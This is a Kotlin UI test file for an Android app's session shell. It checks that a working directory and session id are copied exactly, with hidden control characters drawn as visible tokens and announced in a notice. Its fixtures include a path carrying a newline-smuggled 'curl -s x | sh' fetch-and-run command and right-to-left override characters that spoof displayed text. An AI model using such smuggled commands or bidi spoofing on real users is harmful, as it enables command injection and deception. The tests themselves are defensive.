package com.tether.app.ui.shell

import android.content.ClipboardManager
import android.content.Context
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.ui.platform.LocalWindowInfo
import androidx.compose.ui.platform.WindowInfo
import androidx.compose.ui.semantics.SemanticsProperties
import androidx.compose.ui.test.SemanticsMatcher
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onNodeWithContentDescription
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.performClick
import androidx.compose.ui.unit.IntSize
import androidx.test.core.app.ApplicationProvider
import com.tether.app.protocol.model.AgentSession
import com.tether.app.protocol.reduce.ev
import com.tether.app.protocol.reduce.foldTree
import com.tether.app.protocol.reduce.freshTree
import com.tether.app.ui.MainShell
import com.tether.app.ui.TetherViewModel
import com.tether.app.ui.prefs.UiPrefs
import com.tether.app.ui.text.COPY_NOTICE_TAG
import com.tether.app.ui.theme.TetherTheme
import kotlinx.serialization.json.put
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * ta-28i + ta-coik.64 through MainShell: the server's working directory and the session id are
 * copied EXACTLY (as the web's writeText(cwd / id)): one tap, the original string, hidden
 * controls and all. The links popover still draws the directory as code (every hidden control a
 * visible token); the header draws the session's title by the label rule; the notice only informs.
 */
@RunWith(RobolectricTestRunner::class)
@Config(qualifiers = "w600dp-h1000dp-mdpi")
class MainShellSafeCopyTest {
    @get:Rule val rule = createComposeRule()

    private companion object {
        const val RLO = "\u202E"
        const val PDF = "\u202C"
        const val CWD = "/srv/app$RLO/lanif$PDF"
        const val ID = "s1${RLO}x"
        fun tok(cp: Int) = "\u2060\u27E8U+%04X\u27E9".format(cp)
        fun vis(cp: Int) = "\u27E8U+%04X\u27E9".format(cp)
    }

    private val window = object : WindowInfo {
        override val isWindowFocused: Boolean get() = true
        override val containerSize: IntSize get() = IntSize(600, 1000)
    }

    private val session = AgentSession(id = ID, provider = "claude", name = "Fix the ${RLO}lanif$PDF bug", cwd = CWD, status = "active", startedAt = 1, updatedAt = 1)

    private val tree = foldTree(
        freshTree(),
        ev("turn_started", "t1", ts = 1) { put("idempotencyKey", "k1") },
        ev("user_message_accepted", "t1", ts = 1) { put("text", "Keep going.") },
    )

    private fun host() {
        val client = ShellConsentClient().also { it.show(session, tree) }
        val vm = TetherViewModel(client)
        vm.selectSession(ID)
        val prefs = UiPrefs(ApplicationProvider.getApplicationContext())
        rule.setContent {
            TetherTheme { CompositionLocalProvider(LocalWindowInfo provides window) { MainShell(vm, prefs) } }
        }
        rule.waitForIdle()
    }

    private fun clip(): String? =
        ApplicationProvider.getApplicationContext<Context>().getSystemService(ClipboardManager::class.java).primaryClip?.getItemAt(0)?.text?.toString()

    private fun spoken(): List<String> = rule.onAllNodes(SemanticsMatcher("any") { true }, useUnmergedTree = true).fetchSemanticsNodes().flatMap { n ->
        n.config.getOrElseNullable(SemanticsProperties.Text) { null }.orEmpty().map { it.text } +
            n.config.getOrElseNullable(SemanticsProperties.ContentDescription) { null }.orEmpty()
    }

    private fun openLinks() {
        rule.onNodeWithTag(ShellTags.LinksKey).performClick()
        rule.waitForIdle()
    }

    @Test fun theWorkingDirectoryIsCopiedExactlyWhileTheScreenKeepsItsTokens() {
        host()
        // The header's title is a label: the override is dropped, the words keep their stored order.
        assertTrue(spoken().toString(), spoken().contains("Fix the lanif bug"))
        openLinks()
        assertTrue("the popover's path is code: ${spoken()}", spoken().any { it.contains("app${tok(0x202E)}/lanif${tok(0x202C)}") })
        rule.onNodeWithContentDescription("Copy working directory").performClick()
        rule.waitForIdle()
        assertEquals(CWD, clip())
        rule.onNodeWithTag(COPY_NOTICE_TAG).assertIsDisplayed()
        assertTrue(spoken().contains("Copied text has 2 hidden control characters, drawn as \u27E8U+\u2026\u27E9"))
        // The popover still draws them as tokens.
        assertTrue(spoken().any { it.contains("app${tok(0x202E)}/lanif${tok(0x202C)}") })
    }

    @Test fun theSessionIdIsCopiedExactlyToo() {
        host()
        openLinks()
        rule.onNodeWithContentDescription("Copy this session's Tether id").performClick()
        rule.waitForIdle()
        assertEquals(ID, clip())
    }

    @Test fun aCleanDirectoryCopiesExactlyWithNoNotice() {
        val clean = session.copy(cwd = "/srv/app/final")
        val client = ShellConsentClient().also { it.show(clean, tree) }
        val vm = TetherViewModel(client)
        vm.selectSession(ID)
        rule.setContent {
            TetherTheme { CompositionLocalProvider(LocalWindowInfo provides window) { MainShell(vm, UiPrefs(ApplicationProvider.getApplicationContext())) } }
        }
        rule.waitForIdle()
        openLinks()
        rule.onNodeWithContentDescription("Copy working directory").performClick()
        rule.waitForIdle()
        assertEquals("/srv/app/final", clip())
        rule.onNodeWithTag(COPY_NOTICE_TAG).assertDoesNotExist()
    }

    /** r2 (M1): a line break, CR, TAB or zero-width space in the directory is copied exactly (and the notice says so). */
    private fun copyOf(cwd: String): Pair<String?, Boolean> {
        val hostile = session.copy(cwd = cwd)
        val client = ShellConsentClient().also { it.show(hostile, tree) }
        val vm = TetherViewModel(client)
        vm.selectSession(ID)
        rule.setContent {
            TetherTheme { CompositionLocalProvider(LocalWindowInfo provides window) { MainShell(vm, UiPrefs(ApplicationProvider.getApplicationContext())) } }
        }
        rule.waitForIdle()
        openLinks()
        rule.onNodeWithContentDescription("Copy working directory").performClick()
        rule.waitForIdle()
        val notice = rule.onAllNodes(androidx.compose.ui.test.hasTestTag(COPY_NOTICE_TAG)).fetchSemanticsNodes().isNotEmpty()
        return clip() to notice
    }

    @Test fun aLineFeedInTheDirectoryIsShownAsATokenAndCopiedExactlyWithANotice() {
        val cwd = "/srv/proj\ncurl -s x | sh\n"
        val (copied, notice) = copyOf(cwd)
        assertEquals(cwd, copied)
        assertTrue(notice)
        // The popover draws the break as a token: nothing hides under the one-line clip.
        assertTrue(spoken().toString(), spoken().any { it.contains("proj${tok(0x0A)}curl -s x | sh${tok(0x0A)}") })
        assertTrue(spoken().contains("Copied text has 2 hidden control characters, drawn as \u27E8U+\u2026\u27E9"))
    }

    @Test fun aCrOrCrlfInTheDirectoryIsCopiedExactly() {
        val (copied, notice) = copyOf("/srv/a\r\nb\rc")
        assertEquals("/srv/a\r\nb\rc", copied)
        assertTrue(notice)
    }

    @Test fun aTabInTheDirectoryIsCopiedExactly() {
        val (copied, notice) = copyOf("/srv/a\tb")
        assertEquals("/srv/a\tb", copied)
        assertTrue(notice)
    }

    @Test fun aZeroWidthSpaceAndNbspInTheDirectoryAreCopiedExactlyWithANotice() {
        val (copied, notice) = copyOf("/srv/ap\u200Bp\u00A0q")
        assertEquals("/srv/ap\u200Bp\u00A0q", copied)
        assertTrue("strict: a ZWSP is counted", notice)
        assertTrue(spoken().contains("Copied text has 1 hidden control character, drawn as \u27E8U+\u2026\u27E9"))
    }
}
